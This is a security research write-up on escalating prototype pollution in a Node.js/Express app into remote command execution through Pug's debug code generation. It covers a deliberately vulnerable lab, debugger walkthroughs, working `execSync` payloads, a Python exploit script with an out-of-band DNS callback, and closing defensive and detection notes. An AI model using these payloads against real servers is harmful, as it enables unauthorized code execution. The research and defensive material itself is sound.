---
title: "AST Injection through Pug"
date: 2026-05-17
category: "web-security"
difficulty: "advanced"
source: "7heKnight Research"
tags: [nodejs, pug, prototype-pollution, ast-injection, rce, web-security]
excerpt: "A rebuilt research note on turning Prototype Pollution into code execution through Pug's AST/code-generation path, with a controlled lab, debugger observations, exploit shape and defensive notes."
cover: "/writeups/ast-injection-through-pug/AST_FinalResult.png"
draft: false
---

> Authorization note: this writeup uses a deliberately vulnerable local lab.
> Only reproduce these techniques in environments you own or are explicitly
> authorized to test.

## Background

This research started from an interview-style lab that grouped several web
vulnerabilities together: race conditions, Text4Shell and Prototype Pollution.
The Prototype Pollution machine was the one that stayed in my head, because it
was not only changing object behavior - it was being used to reach code
execution.

After the lab, I followed a public post about AST Injection in Pug and rebuilt
the technique locally. The goal of this note is to document the chain clearly:

- where the vulnerable merge happens;
- how polluted prototype properties reach Pug's internal AST;
- why `debug: true` changes the generated JavaScript;
- how the payload shape evolves from a debugger observation into a practical
  proof of concept;
- what should be fixed to prevent this class of bug.

## Vulnerability Chain

The chain is easier to reason about as four steps:

1. The application accepts attacker-controlled JSON.
2. A recursive merge copies that JSON into a normal JavaScript object.
3. A `__proto__` key pollutes `Object.prototype`.
4. Pug later compiles a template and reads inherited AST-like properties during
   code generation.

Prototype Pollution is the bug that gives us influence over inherited object
properties. AST Injection is the compiler-side consequence: the template engine
mistakes attacker-controlled inherited data for part of the syntax tree.

## Lab Setup

The lab is intentionally small. It exposes one route that performs an unsafe
merge and one route that compiles a Pug template.

`package.json`:

```json
{
  "dependencies": {
    "body-parser": "^1.20.2",
    "express": "^4.18.2",
    "pug": "^3.0.2"
  }
}
```

`index.js`:

```javascript
const express = require('express');
const pug = require('pug');
const path = require('path');

const app = express();
app.use(require('body-parser').json());

function isObject(obj) {
  return typeof obj === 'function' || typeof obj === 'object';
}

function merge(target, source) {
  for (const key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }

  return target;
}

app.get('/', function (req, res) {
  if (req.query.source !== undefined) {
    res.sendFile(path.join(__dirname, 'index.js'));
    return;
  }

  const template = pug.compile('7heknight', { debug: true });
  res.end(
    '<h1>hard code better than template change my mind</h1>' +
      template() +
      '<br><a href="?source">Debug</a>'
  );
});

app.post('/vulnerable', function (req, res) {
  const object = {};

  try {
    merge(object, req.body);
    res.json(object);
  } catch (error) {
    process.exit();
  }
});

console.log('listen on port 4000');
app.listen(4000);
```

Run the lab:

```bash
npm install
node index.js
```

The dangerous part is the `merge()` function. It recursively assigns arbitrary
keys from the request body and does not block `__proto__`, `constructor` or
`prototype`. Because `object` is a normal object, writing through `__proto__`
can affect objects created elsewhere in the same process.

## What Is an AST?

An Abstract Syntax Tree (AST) is a structured representation of source code.
Template engines such as Pug parse template text into an AST, then walk that AST
to generate JavaScript.

![AST overview](/writeups/ast-injection-through-pug/AST0.jpg)

In a safe compiler pipeline, only the lexer and parser should create trusted AST
nodes. The interesting failure here is that polluted prototype properties can
look like extra AST fields during code generation. If the compiler does not
strictly check ownership and type, inherited data can influence generated code.

## Walking Pug's Compile Path

The public research started with `compileFile()`, so I followed the same path:

```javascript
const pug = require('pug');

const compiledFunction = pug.compileFile('template.pug');
console.log(compiledFunction());
```

The exported `pug` object exposes several compile helpers, including
`compile`, `compileFile` and `compileClient`.

![Pug library exports](/writeups/ast-injection-through-pug/pug_library.png)

Stepping into `compileFile()` shows that the function mostly handles file
loading and cache behavior before delegating back into the common compile path.

![Pug compileFile](/writeups/ast-injection-through-pug/pug0.png)

Inside `handleTemplateCache()`, execution reaches `compile()`.

![Pug template cache path](/writeups/ast-injection-through-pug/pug1.png)

`compile()` then calls `compileBody()`, where Pug creates the AST and passes it
into code generation.

![Pug compile body](/writeups/ast-injection-through-pug/pug2.png)

The key flow is:

```text
pug.compile()
  -> compileBody()
  -> generateCode(ast, options)
  -> pug-code-gen Compiler
  -> visit(node)
```

Following `generateCode()` leads into `node_modules/pug-code-gen/index.js`.

![Pug code generator exports](/writeups/ast-injection-through-pug/pug_generator0.png)

The compiler walks each node through `visit()`.

![Pug visit function](/writeups/ast-injection-through-pug/pug_generator1.png)

With debug mode enabled, the generated function tracks template line numbers.
The relevant behavior is that `node.line` is placed into generated JavaScript as
part of `pug_debug_line`.

![Pug debug line generation](/writeups/ast-injection-through-pug/pug_generator2.png)

That is the sink. If attacker-controlled data can become `node.line`, and that
data is treated as JavaScript rather than a numeric line value, the compiler can
emit attacker-controlled code.

## First Proof of Concept

The first local test pollutes `Object.prototype.block` with an AST-looking
object:

```javascript
const pug = require('pug');

Object.prototype.block = {
  type: 'Text',
  line: "console.log(process.mainModule.require('child_process').execSync('id').toString())"
};

pug.compile('h1= msg', { debug: true });
```

The resulting compiled function contains the injected expression in the debug
line assignment:

```javascript
pug_debug_line = console.log(
  process.mainModule.require('child_process').execSync('id').toString()
);
```

That confirms the important part of the chain: the polluted property can cross
from object prototype state into Pug's generated JavaScript.

![Compiled output comparison](/writeups/ast-injection-through-pug/pug_compares0.png)

## Debugging the Better Payload Shape

The first proof of concept works, but I wanted to understand why the final
payload in the public post had a slightly different shape. While stepping
through Pug, I found `visitCode()`, the function responsible for processing
`Code` nodes.

![Pug visitCode function](/writeups/ast-injection-through-pug/AST_VisitCode0.png)

At runtime, the `code` object looked like this:

![Runtime Code node](/writeups/ast-injection-through-pug/AST_VisitCode1.png)

Represented as JSON-style data:

```json
{
  "type": "Code",
  "val": "123",
  "buffer": true,
  "mustEscape": true,
  "isInline": true,
  "line": 1,
  "column": 3,
  "block": {
    "type": "Text",
    "line": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"
  }
}
```

That observation explains the optimized exploit shape. Instead of trying to
recreate a full node manually, we can pollute the properties Pug will consult
while visiting the AST.

## Optimized Local Exploit

Based on the debugger output, the local exploit becomes:

```javascript
const pug = require('pug');

Object.prototype.block = {
  type: 'Text',
  line: "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"
};

Object.prototype.code = {};
pug.compile('h1', { debug: true });
```

![Local AST result](/writeups/ast-injection-through-pug/AST_Result.png)

The simplified version still reaches the same sink and executes during Pug's
compile phase.

![Final local AST result](/writeups/ast-injection-through-pug/AST_FinalResult.png)

## Exploiting the Lab Server

On the lab server, the exploit has two phases:

1. Send a polluted JSON body to `/vulnerable`.
2. Trigger `/` so the server compiles the Pug template.

A controlled outbound DNS lookup is enough to prove command execution without
requiring an interactive shell.

```python
import requests

TARGET_URL = 'http://127.0.0.1:4000'

proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

payload = {
    '__proto__': {
        'code': {},
        'block': {
            'type': 'Text',
            'line': "process.mainModule.require('child_process').execSync('nslookup ast-injection.example.oastify.com')",
        },
    }
}

print(f'[+] Polluting prototype through {TARGET_URL}/vulnerable')
pollute = requests.post(TARGET_URL + '/vulnerable', proxies=proxy, json=payload)
print(f'[+] POST status: {pollute.status_code}')

print(f'[+] Triggering Pug compilation through {TARGET_URL}/')
trigger = requests.get(TARGET_URL + '/', proxies=proxy)
print(f'[+] GET status: {trigger.status_code}')
```

The same object can also be represented with the `block` nested under `code`:

```json
{
  "__proto__": {
    "code": {
      "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('nslookup ast-injection.example.oastify.com')"
      }
    }
  }
}
```

After triggering the template compilation route, the collaborator received the
DNS interaction.

![Collaborator interaction](/writeups/ast-injection-through-pug/4000_interaction.png)

In the original lab, this was also validated with an interactive callback.
That should only be done inside an explicitly authorized environment, because
at this point the impact is already remote command execution in the Node.js
process context.

![Lab callback validation](/writeups/ast-injection-through-pug/reverse_shell.png)

## Root Cause

The vulnerability is not "Pug equals RCE" by itself. The exploit needs a
specific combination:

- an unsafe recursive merge or assignment primitive;
- attacker control over `__proto__`, `constructor` or `prototype`;
- later use of polluted objects by sensitive code;
- Pug compilation with debug behavior that emits `node.line` into generated
  JavaScript.

The application bug is the prototype pollution primitive. Pug's compiler path is
the impact amplifier.

## Defensive Notes

The most important fix is to remove the pollution primitive:

- reject `__proto__`, `constructor` and `prototype` in user-controlled object
  keys;
- avoid custom recursive merge logic for untrusted input;
- use hardened merge libraries and keep dependencies updated;
- create dictionaries with `Object.create(null)` when prototype inheritance is
  not needed;
- validate JSON schemas before merging;
- avoid compiling templates dynamically from request-driven state;
- disable unnecessary debug behavior in production;
- run Node.js services with least privilege and egress monitoring.

For detection, look for suspicious request bodies containing keys such as
`__proto__`, deeply nested `constructor.prototype`, or AST-shaped properties
like `type`, `block`, `line` and `code`.

## Takeaways

Prototype Pollution becomes dangerous when polluted properties cross into code
that treats object shape as trusted. Template engines, serializers, validators
and compilers are high-value places to review because they often walk complex
objects and generate behavior from them.

For this lab, the shortest explanation is:

```text
unsafe merge -> Object.prototype pollution -> inherited AST fields -> Pug debug codegen -> command execution
```

## References

- [AST Injection - n00b-bot](https://n00b-bot.github.io/ast-injection/)
- [AST Injection - archived p6.is research](https://web.archive.org/web/20210813024244/https://blog.p6.is/AST-Injection/)
